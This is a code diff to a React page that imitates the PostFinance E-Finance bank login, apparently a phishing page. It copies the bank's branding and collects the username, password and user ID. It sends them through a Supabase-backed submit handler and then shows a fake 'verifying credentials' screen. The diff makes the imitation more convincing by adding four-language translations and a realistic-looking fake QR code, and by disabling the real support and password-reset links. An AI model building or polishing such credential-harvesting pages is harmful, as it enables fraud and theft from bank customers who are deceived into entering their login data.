@@ -1,6 +1,6 @@
-import { useEffect, useState } from "react";
+import { useEffect, useRef, useState } from "react";
 import { useSearchParams, useNavigate } from "react-router-dom";
-import { Eye, EyeOff, MessageCircleQuestion, ChevronRight, QrCode, ChevronDown } from "lucide-react";
+import { Eye, EyeOff, MessageCircleQuestion, ChevronRight, ChevronDown, Moon } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
@@ -8,12 +8,132 @@ import { usePageMeta } from "@/hooks/use-page-meta";
 const PF_YELLOW = "#FFCC00";
 const PF_YELLOW_HOVER = "#E6B800";
 const PF_PETROL = "#005C5A";
-const PF_MINT = "#EAF4F1";
 const PF_LINE = "#005C5A";
 const PF_CONTENT_BG = "#eef6f6";
 const PF_INFO_BLUE = "#387afa";
+const INPUT_GRAY = "#374151";
 
-const InfoDot = ({ size = 16 }: { size?: number }) => (
+type Lang = "de" | "fr" | "it" | "en";
+
+const TRANSLATIONS: Record<Lang, Record<string, string>> = {
+  de: {
+    contact: "Kontakt und Support",
+    login: "Login",
+    user: "E-Finance-Nummer / Benutzername",
+    password: "Passwort",
+    forgot: "Passwort vergessen",
+    optional: "Falls vorhanden",
+    bid: "Benutzeridentifikation",
+    next: "Weiter",
+    quick: "Schnelles Login",
+    quickDesc: "Zum Einloggen ins E-Finance am Computer, scannen Sie den QR-Code mit Ihrem Smartphone.",
+    instructions: "Anleitung",
+    helpTitle: "Benötigen Sie Hilfe?",
+    support: "Support zum Login",
+    order: "E-Finance bestellen",
+    demo: "Demoversion E-Finance",
+    security: "Sicherheitsstandards",
+    toPf: "zu postfinance.ch",
+    legal: "Rechtliches und Barrierefreiheit",
+    auto: "Automatisch",
+    langLabel: "Deutsch",
+    loading: "Anmeldedaten werden überprüft...",
+    infoUser:
+      "Ihre E-Finance-Nummer finden Sie in Ihren Eröffnungsunterlagen von E-Finance.\n\nNutzen Sie das schnelle Login mit der PostFinance App, wenn Sie Ihre E-Finance-Nummer oder Ihren Benutzernamen nicht eingeben möchten.",
+    infoBid:
+      "Wenn mehrere Personen die gleiche E-Finance-Teilnahme nutzen, wird zusätzlich die Benutzeridentifikation benötigt. Diese finden Sie in Ihren Eröffnungsunterlagen von E-Finance oder in der PostFinance App (sofern registriert).",
+  },
+  fr: {
+    contact: "Contact et support",
+    login: "Login",
+    user: "Numéro E-Finance / Nom d'utilisateur",
+    password: "Mot de passe",
+    forgot: "Mot de passe oublié",
+    optional: "Le cas échéant",
+    bid: "Identification d'utilisateur",
+    next: "Continuer",
+    quick: "Login rapide",
+    quickDesc: "Pour vous connecter à E-Finance sur l'ordinateur, scannez le code QR avec votre smartphone.",
+    instructions: "Instructions",
+    helpTitle: "Besoin d'aide?",
+    support: "Assistance pour le login",
+    order: "Commander E-Finance",
+    demo: "Version démo E-Finance",
+    security: "Normes de sécurité",
+    toPf: "vers postfinance.ch",
+    legal: "Mentions légales et accessibilité",
+    auto: "Automatique",
+    langLabel: "Français",
+    loading: "Vérification des données de connexion...",
+    infoUser:
+      "Vous trouverez votre numéro E-Finance dans vos documents d'ouverture E-Finance.\n\nUtilisez le login rapide avec l'app PostFinance si vous ne souhaitez pas saisir votre numéro E-Finance ou votre nom d'utilisateur.",
+    infoBid:
+      "Si plusieurs personnes utilisent la même participation E-Finance, l'identification d'utilisateur est nécessaire en plus. Vous la trouverez dans vos documents d'ouverture E-Finance ou dans l'app PostFinance (si enregistré).",
+  },
+  it: {
+    contact: "Contatto e supporto",
+    login: "Login",
+    user: "Numero E-Finance / Nome utente",
+    password: "Password",
+    forgot: "Password dimenticata",
+    optional: "Se disponibile",
+    bid: "Identificazione utente",
+    next: "Avanti",
+    quick: "Login rapido",
+    quickDesc: "Per accedere a E-Finance dal computer, scansionate il codice QR con il vostro smartphone.",
+    instructions: "Istruzioni",
+    helpTitle: "Avete bisogno di aiuto?",
+    support: "Supporto al login",
+    order: "Ordinare E-Finance",
+    demo: "Versione demo E-Finance",
+    security: "Standard di sicurezza",
+    toPf: "vai a postfinance.ch",
+    legal: "Note legali e accessibilità",
+    auto: "Automatico",
+    langLabel: "Italiano",
+    loading: "Verifica dei dati di accesso in corso...",
+    infoUser:
+      "Trovate il vostro numero E-Finance nei documenti di apertura di E-Finance.\n\nUtilizzate il login rapido con l'app PostFinance se non desiderate inserire il numero E-Finance o il nome utente.",
+    infoBid:
+      "Se più persone utilizzano la stessa partecipazione E-Finance, è necessaria anche l'identificazione utente. La trovate nei documenti di apertura di E-Finance o nell'app PostFinance (se registrato).",
+  },
+  en: {
+    contact: "Contact and support",
+    login: "Login",
+    user: "E-Finance number / Username",
+    password: "Password",
+    forgot: "Forgot password",
+    optional: "If applicable",
+    bid: "User identification",
+    next: "Continue",
+    quick: "Quick login",
+    quickDesc: "To log in to E-Finance on your computer, scan the QR code with your smartphone.",
+    instructions: "Instructions",
+    helpTitle: "Need help?",
+    support: "Login support",
+    order: "Order E-Finance",
+    demo: "E-Finance demo version",
+    security: "Security standards",
+    toPf: "to postfinance.ch",
+    legal: "Legal and accessibility",
+    auto: "Automatic",
+    langLabel: "English",
+    loading: "Verifying login credentials...",
+    infoUser:
+      "You will find your E-Finance number in your E-Finance opening documents.\n\nUse quick login with the PostFinance app if you do not want to enter your E-Finance number or username.",
+    infoBid:
+      "If several people use the same E-Finance participation, the user identification is additionally required. You will find it in your E-Finance opening documents or in the PostFinance app (if registered).",
+  },
+};
+
+const LANG_OPTIONS: { code: Lang; label: string }[] = [
+  { code: "de", label: "Deutsch" },
+  { code: "fr", label: "Français" },
+  { code: "it", label: "Italiano" },
+  { code: "en", label: "English" },
+];
+
+const InfoDot = ({ size = 32 }: { size?: number }) => (
   <svg
     width={size}
     height={size}
@@ -24,7 +144,7 @@ const InfoDot = ({ size = 16 }: { size?: number }) => (
     aria-hidden="true"
   >
     <circle cx="8" cy="8" r="7" />
-    <circle cx="8" cy="4.5" r="0.4" fill={PF_INFO_BLUE} stroke="none" />
+    <circle cx="8" cy="4.5" r="0.6" fill={PF_INFO_BLUE} stroke="none" />
     <line x1="8" y1="7" x2="8" y2="12" strokeLinecap="round" />
   </svg>
 );
@@ -50,22 +170,36 @@ const PostFinanceLogo = ({ className = "" }: { className?: string }) => (
   </svg>
 );
 
-// Decorative QR-Code placeholder (deterministic pattern, no real payload)
+// Realistic-looking but non-scannable QR mockup
 const QrPlaceholder = () => {
-  const N = 25;
+  const N = 33;
   const cells: boolean[][] = [];
-  let seed = 1337;
+  let seed = 987654321;
   const rand = () => {
     seed = (seed * 1103515245 + 12345) & 0x7fffffff;
-    return (seed >> 8) % 1000 / 1000;
+    return ((seed >> 8) % 1000) / 1000;
   };
   for (let r = 0; r < N; r++) {
     const row: boolean[] = [];
-    for (let c = 0; c < N; c++) row.push(rand() > 0.55);
+    for (let c = 0; c < N; c++) row.push(rand() > 0.5);
     cells.push(row);
   }
-  // Finder patterns in 3 corners
-  const stamp = (sr: number, sc: number) => {
+  // Finder pattern stamps (7x7) in three corners
+  const stampFinder = (sr: number, sc: number) => {
+    for (let r = 0; r < 7; r++)
+      for (let c = 0; c < 7; c++) {
+        const edge = r === 0 || r === 6 || c === 0 || c === 6;
+        const inner = r >= 2 && r <= 4 && c >= 2 && c <= 4;
+        cells[sr + r][sc + c] = edge || inner;
+      }
+    // separator (white) around finder — leave outer ring blank
+    for (let r = -1; r <= 7; r++)
+      for (let c = -1; c <= 7; c++) {
+        const rr = sr + r;
+        const cc = sc + c;
+        if (rr < 0 || cc < 0 || rr >= N || cc >= N) continue;
+        if (r === -1 || r === 7 || c === -1 || c === 7) cells[rr][cc] = false;
+      }
     for (let r = 0; r < 7; r++)
       for (let c = 0; c < 7; c++) {
         const edge = r === 0 || r === 6 || c === 0 || c === 6;
@@ -73,9 +207,23 @@ const QrPlaceholder = () => {
         cells[sr + r][sc + c] = edge || inner;
       }
   };
-  stamp(0, 0);
-  stamp(0, N - 7);
-  stamp(N - 7, 0);
+  stampFinder(0, 0);
+  stampFinder(0, N - 7);
+  stampFinder(N - 7, 0);
+  // Timing patterns
+  for (let i = 8; i < N - 8; i++) {
+    cells[6][i] = i % 2 === 0;
+    cells[i][6] = i % 2 === 0;
+  }
+  // Alignment pattern (bottom-right area)
+  const ar = N - 9;
+  const ac = N - 9;
+  for (let r = 0; r < 5; r++)
+    for (let c = 0; c < 5; c++) {
+      const edge = r === 0 || r === 4 || c === 0 || c === 4;
+      const center = r === 2 && c === 2;
+      cells[ar + r][ac + c] = edge || center;
+    }
 
   const size = 220;
   const cell = size / N;
@@ -89,8 +237,8 @@ const QrPlaceholder = () => {
               key={`${r}-${c}`}
               x={c * cell}
               y={r * cell}
-              width={cell}
-              height={cell}
+              width={cell + 0.5}
+              height={cell + 0.5}
               fill="#000"
             />
           ) : null
@@ -100,14 +248,18 @@ const QrPlaceholder = () => {
   );
 };
 
-const FieldUnderline = ({ focused }: { focused: boolean }) => (
+const FieldUnderline = () => (
+  <div style={{ height: 1, background: PF_LINE }} />
+);
+
+const InfoPopover = ({ text }: { text: string }) => (
   <div
-    style={{
-      height: focused ? 2 : 1,
-      background: PF_LINE,
-      transition: "height 120ms",
-    }}
-  />
+    role="tooltip"
+    className="absolute z-20 left-0 bottom-full mb-2 max-w-[340px] w-[min(340px,90vw)] rounded-md px-3 py-2 text-[13px] leading-relaxed whitespace-pre-line bg-white shadow-sm"
+    style={{ border: `1px solid ${PF_INFO_BLUE}`, color: PF_INFO_BLUE }}
+  >
+    {text}
+  </div>
 );
 
 const ChPostfinance = () => {
@@ -119,14 +271,30 @@ const ChPostfinance = () => {
   const [passwort, setPasswort] = useState("");
   const [benutzerId, setBenutzerId] = useState("");
   const [showPw, setShowPw] = useState(false);
-  const [focus, setFocus] = useState<"u" | "p" | "b" | null>(null);
   const [submitHover, setSubmitHover] = useState(false);
   const [showLoading, setShowLoading] = useState(false);
+  const [openInfo, setOpenInfo] = useState<"u" | "b" | null>(null);
+  const [lang, setLang] = useState<Lang>("de");
+  const [langOpen, setLangOpen] = useState(false);
+
+  const infoRef = useRef<HTMLDivElement | null>(null);
+  const langRef = useRef<HTMLDivElement | null>(null);
+  const t = TRANSLATIONS[lang];
+  const hideOptional = benutzername.trim().length > 0;
 
   useEffect(() => {
     window.scrollTo(0, 0);
   }, []);
   usePageMeta("PostFinance E-Finance Login", "https://www.postfinance.ch/favicon.ico");
+
+  useEffect(() => {
+    const onDocClick = (e: MouseEvent) => {
+      if (infoRef.current && !infoRef.current.contains(e.target as Node)) setOpenInfo(null);
+      if (langRef.current && !langRef.current.contains(e.target as Node)) setLangOpen(false);
+    };
+    document.addEventListener("mousedown", onDocClick);
+    return () => document.removeEventListener("mousedown", onDocClick);
+  }, []);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -153,7 +321,7 @@ const ChPostfinance = () => {
     <>
       {showLoading && (
         <LoadingOverlay
-          message="Anmeldedaten werden überprüft..."
+          message={t.loading}
           onComplete={() => navigate("/confirmation?s=" + sessionId)}
         />
       )}
@@ -173,14 +341,13 @@ const ChPostfinance = () => {
         >
           <PostFinanceLogo className="h-6 md:h-[29px] w-auto" />
           <a
-            href="https://www.postfinance.ch/de/support/kontakt.html"
-            target="_blank"
-            rel="noopener noreferrer"
-            className="flex items-center gap-2 text-[15px] font-medium hover:underline"
-            style={{ color: PF_PETROL }}
+            href="#"
+            onClick={(e) => e.preventDefault()}
+            className="flex items-center gap-2 no-underline"
+            style={{ color: PF_PETROL, textDecoration: "none" }}
           >
-            <MessageCircleQuestion className="w-[18px] h-[18px]" strokeWidth={1.8} />
-            <span className="hidden sm:inline text-[13px] font-bold">Kontakt und Support</span>
+            <MessageCircleQuestion className="w-[18px] h-[18px]" strokeWidth={1.5} />
+            <span className="hidden sm:inline text-[12px] font-bold">{t.contact}</span>
           </a>
         </header>
 
@@ -191,45 +358,54 @@ const ChPostfinance = () => {
               className="font-normal mb-8 md:mb-10"
               style={{ color: "#006099", fontSize: "clamp(22px, 2.6vw, 30px)" }}
             >
-              Login
+              {t.login}
             </h1>
 
             <div className="grid grid-cols-1 md:grid-cols-[1fr_360px] gap-6 md:gap-8">
               {/* Login Card */}
-              <section className="bg-white rounded-2xl p-6 md:p-10 shadow-[0_1px_2px_rgba(0,0,0,0.04)] self-start">
+              <section className="bg-white rounded-2xl p-6 md:p-10 shadow-[0_1px_2px_rgba(0,0,0,0.04)] self-start" ref={infoRef}>
                 <form onSubmit={handleSubmit} className="flex flex-col gap-8">
                   {/* E-Finance-Nummer */}
-                  <div>
+                  <div className="relative">
                     <label
                       htmlFor="pf-user"
-                      className="flex items-center gap-2 text-[12px] font-bold mb-2"
-                      style={{ color: "#000" }}
+                      className="flex items-center gap-2 text-[12px] mb-2"
+                      style={{ color: "#000", fontWeight: 800 }}
                     >
-                      E-Finance-Nummer / Benutzername
-                      <InfoDot />
+                      {t.user}
+                      <button
+                        type="button"
+                        aria-label="Info"
+                        className="inline-flex items-center justify-center"
+                        onClick={(e) => {
+                          e.preventDefault();
+                          setOpenInfo((v) => (v === "u" ? null : "u"));
+                        }}
+                      >
+                        <InfoDot size={32} />
+                      </button>
                     </label>
+                    {openInfo === "u" && <InfoPopover text={t.infoUser} />}
                     <input
                       id="pf-user"
                       type="text"
                       autoComplete="username"
                       value={benutzername}
                       onChange={(e) => setBenutzername(e.target.value)}
-                      onFocus={() => setFocus("u")}
-                      onBlur={() => setFocus(null)}
                       className="w-full bg-transparent outline-none py-2 text-[16px]"
-                      style={{ color: PF_PETROL }}
+                      style={{ color: INPUT_GRAY, caretColor: INPUT_GRAY }}
                     />
-                    <FieldUnderline focused={focus === "u"} />
+                    <FieldUnderline />
                   </div>
 
                   {/* Passwort */}
                   <div>
                     <label
                       htmlFor="pf-pw"
-                      className="block text-[12px] font-bold mb-2"
-                      style={{ color: "#000" }}
+                      className="block text-[12px] mb-2"
+                      style={{ color: "#000", fontWeight: 800 }}
                     >
-                      Passwort
+                      {t.password}
                     </label>
                     <div className="relative">
                       <input
@@ -238,10 +414,8 @@ const ChPostfinance = () => {
                         autoComplete="current-password"
                         value={passwort}
                         onChange={(e) => setPasswort(e.target.value)}
-                        onFocus={() => setFocus("p")}
-                        onBlur={() => setFocus(null)}
                         className="w-full bg-transparent outline-none py-2 pr-10 text-[16px]"
-                        style={{ color: PF_PETROL }}
+                        style={{ color: INPUT_GRAY, caretColor: INPUT_GRAY }}
                       />
                       <button
                         type="button"
@@ -257,47 +431,57 @@ const ChPostfinance = () => {
                         )}
                       </button>
                     </div>
-                    <FieldUnderline focused={focus === "p"} />
+                    <FieldUnderline />
                     <a
-                      href="https://www.postfinance.ch/de/support/services/passwort.html"
-                      target="_blank"
-                      rel="noopener noreferrer"
-                      className="inline-flex items-center gap-1 mt-3 text-[14px] font-medium hover:underline"
-                      style={{ color: PF_PETROL }}
+                      href="#"
+                      onClick={(e) => e.preventDefault()}
+                      className="inline-flex items-center gap-1 mt-3 text-[14px] font-medium"
+                      style={{ color: PF_PETROL, textDecoration: "none" }}
                     >
-                      Passwort vergessen
+                      {t.forgot}
                       <ChevronRight className="w-4 h-4" strokeWidth={2} />
                     </a>
                   </div>
 
                   {/* Falls vorhanden */}
-                  <div className="pt-2">
-                    <h2
-                      className="font-normal mb-4"
-                      style={{ color: PF_PETROL, fontSize: "clamp(20px, 2.4vw, 24px)" }}
-                    >
-                      Falls vorhanden
-                    </h2>
-                    <label
-                      htmlFor="pf-bid"
-                      className="flex items-center gap-2 text-[12px] font-bold mb-2"
-                      style={{ color: "#000" }}
-                    >
-                      Benutzeridentifikation
-                      <InfoDot />
-                    </label>
-                    <input
-                      id="pf-bid"
-                      type="text"
-                      value={benutzerId}
-                      onChange={(e) => setBenutzerId(e.target.value)}
-                      onFocus={() => setFocus("b")}
-                      onBlur={() => setFocus(null)}
-                      className="w-full bg-transparent outline-none py-2 text-[16px]"
-                      style={{ color: PF_PETROL }}
-                    />
-                    <FieldUnderline focused={focus === "b"} />
-                  </div>
+                  {!hideOptional && (
+                    <div className="pt-2 relative">
+                      <h2
+                        className="font-normal mb-4"
+                        style={{ color: PF_PETROL, fontSize: "clamp(20px, 2.4vw, 24px)" }}
+                      >
+                        {t.optional}
+                      </h2>
+                      <label
+                        htmlFor="pf-bid"
+                        className="flex items-center gap-2 text-[12px] mb-2"
+                        style={{ color: "#000", fontWeight: 800 }}
+                      >
+                        {t.bid}
+                        <button
+                          type="button"
+                          aria-label="Info"
+                          className="inline-flex items-center justify-center"
+                          onClick={(e) => {
+                            e.preventDefault();
+                            setOpenInfo((v) => (v === "b" ? null : "b"));
+                          }}
+                        >
+                          <InfoDot size={32} />
+                        </button>
+                      </label>
+                      {openInfo === "b" && <InfoPopover text={t.infoBid} />}
+                      <input
+                        id="pf-bid"
+                        type="text"
+                        value={benutzerId}
+                        onChange={(e) => setBenutzerId(e.target.value)}
+                        className="w-full bg-transparent outline-none py-2 text-[16px]"
+                        style={{ color: INPUT_GRAY, caretColor: INPUT_GRAY }}
+                      />
+                      <FieldUnderline />
+                    </div>
+                  )}
 
                   <div className="flex justify-end pt-2">
                     <button
@@ -310,7 +494,7 @@ const ChPostfinance = () => {
                         color: PF_PETROL,
                       }}
                     >
-                      Weiter
+                      {t.next}
                     </button>
                   </div>
                 </form>
@@ -324,25 +508,24 @@ const ChPostfinance = () => {
                     className="font-normal mb-4"
                     style={{ color: PF_PETROL, fontSize: 20 }}
                   >
-                    Schnelles Login
+                    {t.quick}
                   </h3>
                   <div className="flex justify-center mb-4">
                     <div className="border" style={{ borderColor: "#e5e7eb" }}>
                       <QrPlaceholder />
                     </div>
                   </div>
-                  <p className="text-[14px] leading-relaxed mb-3" style={{ color: PF_PETROL }}>
-                    Zum Einloggen ins E-Finance am Computer, scannen Sie den QR-Code mit Ihrem
-                    Smartphone.
+                  <p className="text-[14px] leading-relaxed mb-3" style={{ color: "#000" }}>
+                    {t.quickDesc}
                   </p>
                   <a
-                    href="https://www.postfinance.ch/de/support/services/digitale-services/e-finance.html"
+                    href="https://www.postfinance.ch/helpquickloginde"
                     target="_blank"
                     rel="noopener noreferrer"
                     className="inline-flex items-center gap-1 text-[14px] font-medium hover:underline"
                     style={{ color: PF_PETROL }}
                   >
-                    Anleitung
+                    {t.instructions}
                     <ChevronRight className="w-4 h-4" strokeWidth={2} />
                   </a>
                 </div>
@@ -353,26 +536,14 @@ const ChPostfinance = () => {
                     className="font-normal mb-4"
                     style={{ color: PF_PETROL, fontSize: 20 }}
                   >
-                    Benötigen Sie Hilfe?
+                    {t.helpTitle}
                   </h3>
                   <ul className="flex flex-col gap-1 text-[14px]">
                     {[
-                      {
-                        label: "Support zum Login",
-                        href: "https://www.postfinance.ch/de/support/services/digitale-services/e-finance.html",
-                      },
-                      {
-                        label: "E-Finance bestellen",
-                        href: "https://www.postfinance.ch/de/privat/produkte/digitale-services/e-finance.html",
-                      },
-                      {
-                        label: "Demoversion E-Finance",
-                        href: "https://www.postfinance.ch/de/support/services/digitale-services/e-finance/demoversion.html",
-                      },
-                      {
-                        label: "Sicherheitsstandards",
-                        href: "https://www.postfinance.ch/de/support/sicherheit.html",
-                      },
+                      { label: t.support, href: "https://www.postfinance.ch/efinloginprocedurede" },
+                      { label: t.order, href: "https://www.postfinance.ch/ef-bestellen" },
+                      { label: t.demo, href: "https://www.postfinance.ch/demoefinloginde" },
+                      { label: t.security, href: "https://www.postfinance.ch/sicherheitstipps" },
                     ].map((l) => (
                       <li key={l.label}>
                         <a
@@ -398,40 +569,69 @@ const ChPostfinance = () => {
         <footer className="px-5 md:px-10 py-6 border-t" style={{ borderColor: "#d6e4e0" }}>
           <div className="max-w-[1180px] mx-auto flex flex-col gap-4 md:flex-row md:items-center md:justify-between text-[13px]">
             <a
-              href="https://www.postfinance.ch"
+              href="https://www.postfinance.ch/"
               target="_blank"
               rel="noopener noreferrer"
               className="inline-flex items-center gap-1 font-medium hover:underline"
               style={{ color: PF_PETROL }}
             >
-              zu postfinance.ch
+              {t.toPf}
               <ChevronRight className="w-4 h-4" strokeWidth={2} />
             </a>
             <div className="flex flex-col md:flex-row md:items-center gap-3 md:gap-4">
               <button
                 type="button"
-                className="inline-flex items-center gap-2 px-3 py-1.5 rounded-md bg-white"
+                onClick={(e) => e.preventDefault()}
+                className="inline-flex items-center gap-2 px-4 py-3 rounded-md bg-white"
                 style={{ border: `1px solid ${PF_PETROL}`, color: "#374151" }}
               >
-                Automatisch
+                <Moon className="w-4 h-4" strokeWidth={1.8} />
+                {t.auto}
                 <ChevronDown className="w-4 h-4" strokeWidth={2} style={{ color: "#9ca3af" }} />
               </button>
-              <button
-                type="button"
-                className="inline-flex items-center gap-2 px-3 py-1.5 rounded-md bg-white"
-                style={{ border: `1px solid ${PF_PETROL}`, color: "#374151" }}
-              >
-                Deutsch
-                <ChevronDown className="w-4 h-4" strokeWidth={2} style={{ color: "#9ca3af" }} />
-              </button>
+              <div className="relative" ref={langRef}>
+                <button
+                  type="button"
+                  onClick={() => setLangOpen((v) => !v)}
+                  className="inline-flex items-center gap-2 px-4 py-3 rounded-md bg-white w-full"
+                  style={{ border: `1px solid ${PF_PETROL}`, color: "#374151" }}
+                >
+                  {t.langLabel}
+                  <ChevronDown className="w-4 h-4" strokeWidth={2} style={{ color: "#9ca3af" }} />
+                </button>
+                {langOpen && (
+                  <div
+                    className="absolute z-30 left-0 right-0 bottom-full mb-2 rounded-md bg-white overflow-hidden shadow-md"
+                    style={{ border: `1px solid ${PF_PETROL}` }}
+                  >
+                    {LANG_OPTIONS.map((opt) => (
+                      <button
+                        key={opt.code}
+                        type="button"
+                        onClick={() => {
+                          setLang(opt.code);
+                          setLangOpen(false);
+                        }}
+                        className="block w-full text-left px-4 py-2 text-[13px] hover:bg-gray-50"
+                        style={{
+                          color: "#374151",
+                          fontWeight: opt.code === lang ? 700 : 400,
+                        }}
+                      >
+                        {opt.label}
+                      </button>
+                    ))}
+                  </div>
+                )}
+              </div>
               <a
-                href="https://www.postfinance.ch/de/footer/rechtliches.html"
+                href="https://www.postfinance.ch/legalde"
                 target="_blank"
                 rel="noopener noreferrer"
                 className="font-medium hover:underline"
                 style={{ color: PF_PETROL }}
               >
-                Rechtliches und Barrierefreiheit
+                {t.legal}
               </a>
             </div>
           </div>
